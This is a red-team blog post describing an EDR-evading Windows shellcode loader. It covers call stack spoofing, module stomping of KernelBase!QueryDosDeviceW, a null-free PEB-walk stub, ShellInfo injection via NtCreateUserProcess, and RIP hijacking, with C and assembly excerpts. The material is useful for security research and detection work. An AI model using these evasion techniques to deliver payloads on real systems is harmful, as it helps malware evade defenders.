---
title: "P³ in the Palace - Hardening the Loader (Part 2)"
date: 2026-10-14
author: vrls
tags: [security, redteam, windows, internals, process-injection, shellcode, evasion, edr, malware, offensive-security, tradecraft, pic, position-independent-code, crystal-palace, p3, process-parameter-poisoning, call-stack-spoofing, module-stomping, peb-walk, ntapi, null-free, shellcodewriter, bof, dfr, winapi, c, asm, research, windows-internals]
image: /assets/img/posts/2026/10/ec7a7352a39045188a6876aa5ba9764a5a97c8d7f5231d700933894ae30a2f9e.png #og:image
description: Addressing OPSEC and detection surface of the original loader — unbacked return addresses and VirtualAlloc telemetry — by adding call stack spoofing, module stomping via a self-contained PEB-walk blob, and a new NtCreateUserProcess-based spawn path.
---


## 1. What Changed and Why

[Part 1](https://vrls.ws/posts/p3-in-the-palace-process-parameter-poisoning-in-crystal-palace/) ended with an honest map of what remained detectable. Two items from that list drove this iteration:

1. **Unbacked return addresses.** Every sensitive NT call came directly from `go()`, which executes from `MEM_PRIVATE` memory. Any EDR walking the call stack on those callbacks sees a return address in a private anonymous region — not where legitimate code calls NT functions from.
2. **`VirtualAlloc` telemetry.** The original `scw_load_and_call` stub called `VirtualAlloc(RW)` inside the child, copied the payload there, then flipped it `RX`. That private allocation is a named indicator.

The repository is at [joaovarelas/P3-Crystal](https://github.com/joaovarelas/P3-Crystal).


![P³-Crystal Loader Architecture](/assets/img/posts/2026/10/09c3fc56e71f9949d3a00e525d063dd3e85a8368cee526b12f16da8ba14a33b7.png)
*Figure 1: P³-Crystal Loader Architecture* 

---


## 2. Call Stack Spoofing

### 2.1 Private Memory Region

A PIC usually executes from `MEM_PRIVATE` memory. When an EDR places a hook on `NtProtectVirtualMemory` or `NtSetContextThread`, the callback sees a return address pointing into a private anonymous mapping. That is not where code is supposed to call NT functions from; legitimate callers are inside signed modules. This pattern — return address outside any module image — is one of the highest-confidence indicators an EDR has. Elastic's [`defense_evasion_unbacked_shellcode_from_unsigned_module`](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/windows/defense_evasion_unbacked_shellcode_from_unsigned_module.toml) rule fires on exactly this: API events where the call stack's final user-mode frame is `Unbacked` and the originating module carries no valid code signature. A positive match triggers `kill_process` on the entire process tree.

The fix is to make every NT call appear to return into a legitimate frame chain.

### 2.2 Implementation

The implementation is the [Draugr](https://github.com/NtDallas/Draugr) / [Crystal-Kit](https://github.com/rasta-mouse/Crystal-Kit) approach, adapted to Crystal Palace PIC constraints. The core stub is `src/draugr.asm`, a NASM flat binary loaded by Crystal Palace via `linkfunc "draugr_stub"`. The C-side `src/spoof.c` handles gadget discovery, frame-size calculation, and a retry wrapper.

`DRAUGR_PARAMETERS` holds per-call context:

```c
typedef struct {
    PVOID ReturnAddress;
    ULONG_PTR Rbx, Rbp, Rdi, Rsi, R12, R13, R14, R15;
    PVOID OriginalReturnAddress;
    PVOID BTIT;               // BaseThreadInitThunk + 0x17
    PVOID RUTS;               // RtlUserThreadStart  + 0x2c
    PVOID Gadget;             // FF 23 (jmp [rbx]) in kernelbase .text
    PVOID Trampoline;
    ULONG_PTR TrampolineStackSize;
} DRAUGR_PARAMETERS;
```

`find_gadget` scans the `.text` section of `kernelbase.dll` (located by ROR13 hash `0xEBC2F9B4`) for `FF 23` (`jmp [rbx]`) bytes, collecting up to 15 candidates and selecting one at random via `RtlRandomEx`. `draugr_wrapper` retries until the chosen trampoline's stack frame allocation is ≥ `0x80` bytes — shallow frames would produce an invalid unwind chain.

The dispatch sequence in `draugr.asm`:

1. Pop the real return address; save non-volatile registers into `DRAUGR_PARAMETERS`.
2. Relocate extra stack arguments (args 5–12) above the synthetic chain.
3. Allocate `0x200` bytes of scratch space.
4. Build the synthetic chain: `NULL → RUTS+0x2c → BTIT+0x17 → trampoline (jmp [rbx])`.
5. Plant a `fixup` pointer in `rbx` via `lea rbx, [rel fixup]`.
6. Call the target function.
7. On return through `jmp [rbx]` → `fixup`: restore RSP and non-volatile registers, jump to `OriginalReturnAddress`.

The `sc()` helper in `loader.c` wraps `spoof_call()` for up to 12 arguments:

```c
status = (NTSTATUS)sc(
    (PVOID)NTDLL$NtCreateUserProcess, 11,
    (ULONG_PTR)&hProcess,        (ULONG_PTR)&hThread,
    (ULONG_PTR)PROCESS_ALL_ACCESS, (ULONG_PTR)THREAD_ALL_ACCESS,
    (ULONG_PTR)NULL, (ULONG_PTR)NULL, (ULONG_PTR)0, (ULONG_PTR)0,
    (ULONG_PTR)procParams, (ULONG_PTR)&createInfo, (ULONG_PTR)&attrList, 0);
```

Most NT calls in `loader.c` go through `sc()`. Notable exception: `RtlCreateProcessParametersEx` — a heap operation with no syscall, direct call is fine.

![Call stack spoofed when calling NtCreateUserProcess](/assets/img/posts/2026/10/f391914545f23dfcb658b8dde043f02d7e2d1897584ddc87e2bb14cf8759dd6e.png)
*Figure 2: Call stack spoofed when calling NtCreateUserProcess `winver.exe`. Highlights the NT call, the gadget and spoofed frames for BaseThreadInitThunk & RtlUserThreadStart.*

### 2.3 CET / Hardware Shadow Stack

This implementation — like Draugr — is defeated by CET. Synthetic return addresses are written via `MOV`; the shadow stack is updated only by `CALL`/`RET`, so the mismatch triggers a `#CP` exception on the first `RET` through the synthetic chain.

---


## 3. Module Stomping: Removing VirtualAlloc

### 3.1 Allocating Memory from Stub

The original `scw_load_and_call` stub called `VirtualAlloc(RW)` inside the child, copied the payload from the stack, then called `VirtualProtect(RX)`. `VirtualQuery` on the resulting region returns `MEM_PRIVATE + MEM_COMMIT` — payload execution from a private allocation is a strong indicator regardless of what triggered the allocation.

The alternative: overwrite an existing exported function in a loaded DLL. `VirtualQuery` on that address still returns `MEM_IMAGE`. The memory looks like code belonging to a signed module.

### 3.2 The Function `scw_stomp_and_call`

A new generator function replaces `scw_load_and_call`. The stub it emits, at runtime in the child:

1. Pushes the payload onto the stack (same null-free `scw_push_buffer` encoding as before).
2. **Walks the PEB** to locate the target DLL and export by ROR13 hash — no DFR, no import table, self-contained.
3. `VirtualProtect(target_export, sc_len, PAGE_READWRITE)`
4. Copies payload from stack into the export's memory.
5. `VirtualProtect(target_export, sc_len, PAGE_EXECUTE_READ)`
6. `jmp target_export`

The PEB walk runs entirely inside the child at execution time. It is written in `src/peb_walk.asm`, assembled to a flat binary, and embedded as a C header by `utils/bin2h_peb.py`. The DLL and export ROR13 hashes are patched into the blob at stub-generation time:

```c
void scw_stomp_and_call(SCW *w, u64 virtual_protect,
                        const char *dll_name, const char *export_name,
                        const u8 *sc, int sc_len,
                        u64 btit_addr, u64 ruts_addr)
{
    u8 blob[PEB_WALK_SIZE];
    // patch DLL_HASH at offset 76 and FUNC_HASH at offset 164
    *(u32 *)(blob + 76)  = _mh_mod(dll_name);   // tolower ROR13
    *(u32 *)(blob + 164) = _mh_exp(export_name); // ROR13
    scw_append(w, blob, PEB_WALK_SIZE);
    // VirtualProtect(RW) → copy → VirtualProtect(RX)
    // → RSP pivot → plant frame chain → jmp r12
}
```

After making the region executable, the stub performs two additional steps before handing off:

**RSP pivot.** `TEB.StackBase` is read from `gs:[0x08]`; RSP is moved to `TEB.StackBase - 0x200`. This places execution in committed stack memory far from the stub's working area.

**Synthetic frame chain.** Three values are planted on the pivoted stack:

```
[RSP + 0x00] = btit_addr   (BaseThreadInitThunk + 0x17)
[RSP + 0x30] = ruts_addr   (RtlUserThreadStart  + 0x2c)
[RSP + 0x70] = NULL
```

`btit_addr` and `ruts_addr` are resolved parent-side and baked into the stub. They are valid in the child because `kernel32.dll` and `ntdll.dll` share ASLR bases across all processes on the same boot.

The blob is null-free. `gs:[rbp+0x60]` (with `rbp` zeroed) accesses the PEB instead of `gs:[rip+0x60]`, because the RIP-relative encoding produces null bytes:

```nasm
xor     rbp, rbp
mov     rax, [gs:rbp+0x60]    ; rax = PEB  (65 48 8B 45 60, no nulls)
mov     rax, [rax+0x18]       ; rax = PEB.Ldr
mov     rax, [rax+0x20]       ; rax = InMemoryOrderModuleList.Flink
```

![Null-byte free stub using SetRAX technique](/assets/img/posts/2026/10/c2ed7a9580ecd46e3a7272b0bf716aaff01b5942faa511aaa2dd1bf21f18f4d2.png)
*Null-byte free stub using SetRAX technique that lives on `ShellInfo.Buffer`. It will decode the original payload, change protection RX -> RW -> RX and write it on target module function (stomp).*

The gap sizes (`SCW_BTIT_ALLOC = 0x28`, `SCW_RUTS_ALLOC = 0x38`) are derived from the `UNWIND_INFO` of each function: `BaseThreadInitThunk` allocates `push rbx` (8) + `sub rsp, 0x20` (32) = 0x28 bytes; `RtlUserThreadStart` allocates 0x38 bytes. A stack walker traversing `BTIT`'s frame reads the return address at `[frame_RSP + 0x28]`, which lands exactly on `ruts_addr`.

The `UNWIND_INFO` for `QueryDosDeviceW` uses `UWOP_SET_FPREG` with seven prior register saves. The PEB walk blob's opening bytes replicate QDD's original prologue (`push rbp/rbx/rsi/rdi/r12/r13/r14 + mov rbp,rsp`) byte-for-byte, so the OS stack walker correctly unwinds those saves and finds `btit_addr` at `[RBP + 0x38]`.

The resulting call stack at any point during payload execution:

```
QueryDosDeviceW → BTIT+0x17 → RUTS+0x2c → NULL
```


### 3.3 Target Selection

Not every export is a safe stomp target. Requirements:

- **Large enough** — body must be at least `sc_len` bytes.
- **Cold** — not called during `winver.exe` startup.
- **Real body** — many `kernelbase.dll` exports are 12-byte apiset-forwarding thunks. Stomping those overwrites the thunk, not a real function body.
- **Always present** — must exist across all supported Windows 10/11 versions.

`kernelbase.dll!QueryDosDeviceW` satisfies all four: 2269-byte body in `kernelbase.dll` itself (not forwarded), not called during `winver.exe` startup, present in all supported versions. The targeted module and function can be easily switched by modifying the values: 

```c
#define SCW_STOMP_MODULE "KernelBase.dll"
#define SCW_STOMP_FUNC   "QueryDosDeviceW"
```


![Before and after stomping the target function on KernelBase.dll](/assets/img/posts/2026/10/50b0361875be9a0de1a3f638a0df4ff68756fe9880b09d1b26bc62cd2a38aaec.png)
*Before and after stomping the target function on KernelBase.dll!QueryDosDeviceW with the payload.*


---


## 4. Spawn Child with NtCreateUserProcess

Part 1 used `CreateProcessW`. The current version calls `NtCreateUserProcess` directly, with parameters constructed through `RtlCreateProcessParametersEx` — which embeds `ShellInfo` at construction time before the process is created:

```c
UNICODE_STRING shellInfoStr = {
    .Buffer        = (PWSTR)stub,
    .Length        = (USHORT)w.len,
    .MaximumLength = (USHORT)sizeof(stub)
};

NTDLL$RtlCreateProcessParametersEx(
    &procParams, &imagePath,
    NULL, NULL, NULL, NULL, NULL, NULL,
    &shellInfoStr, NULL,
    RTL_USER_PROCESS_PARAMETERS_NORMALIZED);
```

The process is created with no suspend flag. The RDTSC spin wait that follows exists to give the child time to initialise its PEB before the parent reads it back. The image path is passed as an NT namespace path (`\??\C:\Windows\System32\winver.exe`), matching what `NtCreateUserProcess` expects directly.

After the child is created, the parent reads back `ShellInfo.Buffer` from the child's `RTL_USER_PROCESS_PARAMETERS`, flips the page `PAGE_EXECUTE_READ` via `NtProtectVirtualMemory`, and redirects the child thread's RIP directly to the stub via `NtSetContextThread`.

---


## 5. Resource Extraction Refactor

The inline XOR loop from Part 1 is now a proper function in `src/resource.c`:

```c
int resource_unmask(const RESOURCE *src, const RESOURCE *key, u8 *dst) {
    int i;
    for (i = 0; i < src->length; i++)
        dst[i] = (u8)(src->value[i] ^ key->value[i % key->length]);
    return src->length;
}
```

Call site:

```c
resource_unmask(masked_sc, mask_key, (u8 *)unmasked_sc);
```


---


## 6. Stub Buffer Size

`scw_stomp_and_call` bakes the payload bytes **into** the stub via `scw_push_buffer` — the payload is not referenced by pointer. Each 8 payload bytes expand to one `set_rax` + `push rax` sequence (24 bytes). The actual macro from `shellwriter.h`:

```c
#define SCW_STUB_SIZE(payload_len)  (((payload_len) / 8 + 1) * 24 + 640)
```

The `+640` covers the PEB walk blob, `VirtualProtect` calls, copy loop, RSP pivot, frame chain planting, and alignment. The stub buffer in `loader.c` is now a VLA:

```c
u8 stub[SCW_STUB_SIZE(masked_sc->length)];
```

`ShellInfo.Length` is a `USHORT`, capping the stub at 65535 bytes. For a ~500-byte payload (message box shellcode), the stub is approximately 1700 bytes — well within that limit.

> For larger payloads such as a Cobalt Strike beacon (~200 KB), a stager approach is required: the stub stays small, fetches and maps the full payload at runtime.

---


## 7. Remaining Detection Surface

**Closed:**
- Unbacked return addresses on NT calls — call stack spoofing replaces them with file-backed `BTIT`/`RUTS` frames.
- `VirtualAlloc` telemetry in the child — module stomping eliminates the private allocation.

**Still open:**
- **`MEM_PRIVATE` stub calling `VirtualProtect`.** The stub in `ShellInfo` is `MEM_PRIVATE`. The `VirtualProtect` calls it emits originate from unbacked memory inside the child. 
- **`NtProtectVirtualMemory` on the `ShellInfo` page.** The parent flips the `ShellInfo` region to `PAGE_EXECUTE_READ`. This is the same named indicator from the original p3-loader whitepaper.
- **Process tree.** The child is spawned with the loader as parent. PPID spoofing via `PS_ATTRIBUTE_PARENT_PROCESS` is the next step, though it introduces its own indicators.
- **RDTSC spin wait.** The current PEB-ready delay is a busy-loop. Polling `PEB.Ldr` via `NtReadVirtualMemory` until non-null is more correct and avoids the spin signature.
- **Userland hook evasion vs. kernel telemetry.** NT calls go through normal userland stubs — the `ssn` field in `FUNCTION_CALL` is unused (set to 0). Replacing stubs with a direct `syscall` dispatch would bypass userland hooks, but modern EDRs increasingly rely on kernel-level telemetry (`PsSetCreateProcessNotifyRoutine`, `ObRegisterCallbacks`, ETW-Ti) that fires regardless.


**Scope of These Improvements:**

The improvements above apply exclusively to the loader itself — the PIC executing in the parent process, **not** to the payload running inside the child.

A Cobalt Strike beacon or any other shellcode delivered via `ShellInfo` carries its own detection surface: its NT calls are not spoofed, its allocations are not stomped, and Crystal Palace primitives like `attach`/`addhook` cannot intercept calls made by code that was never linked through Crystal Palace.

The loader buys OPSEC at process-creation time, shellcode injection and through RIP hijack. **Payload runtime OPSEC is a separate problem, solved at the payload level.**

Crystal Palace's modular architecture — hooks, stubs, and PIC primitives as composable building blocks — makes it straightforward to carry proven tradecraft across projects; the same `attach`/`addhook` patterns, call-stack spoofing, and stomping primitives developed here can be dropped into a different loader or beacon without rework, and Tradecraft Garden serves as the shared library where those patterns are documented and versioned for reuse.

---


## 8. References

[1] M. Hirschberger and O. Ugur, "Process Parameter Poisoning (P³)," SensePost, Jul. 2026. [https://sensepost.com/blog/2026/process-parameter-poisoning/](https://sensepost.com/blog/2026/process-parameter-poisoning/)

[2] Orange-Cyberdefense, "P³-Shellcode Loader," GitHub, 2026. [https://github.com/Orange-Cyberdefense/p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)

[3] R. Mudge, "Crystal Palace Documentation," Adversary Fan Fiction Writers Guild, 2025. [https://tradecraftgarden.org/docs.html](https://tradecraftgarden.org/docs.html)

[4] NtDallas, "Draugr," GitHub, 2025. [https://github.com/NtDallas/Draugr](https://github.com/NtDallas/Draugr)

[5] joaovarelas, "P3-Crystal," GitHub, 2026. [https://github.com/joaovarelas/P3-Crystal](https://github.com/joaovarelas/P3-Crystal)

[6] R. Mudge, "Community Pavilion — Technical Demonstrations," Adversary Fan Fiction Writers Guild (Tradecraft Garden), 2026. [https://tradecraftgarden.org/references.html](https://tradecraftgarden.org/references.html)



---